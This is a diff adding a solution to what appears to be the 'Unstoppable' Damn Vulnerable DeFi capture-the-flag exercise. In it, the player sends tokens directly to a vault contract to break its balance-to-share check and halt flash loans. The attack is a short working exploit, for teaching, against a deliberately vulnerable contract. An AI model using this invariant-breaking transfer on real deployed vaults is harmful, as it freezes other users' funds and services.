@@ -59,6 +59,12 @@ contract UnstoppableTest is Test {
         // You start with 10 DVT tokens in balance.
 
         // Solution
+        // Thought 1: steal all assets
+        // Thought 2: let time pass grace period
+        // Thought 3: make totalAssets() revert, aka find the flag
+        // Action: tranfer tokens directly, bypass deposit, make the Vault failed to pass Balance-Share check.
+        vm.prank(player);
+        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
 
         // It is no longer possible to execute flash loans
         vm.expectRevert();
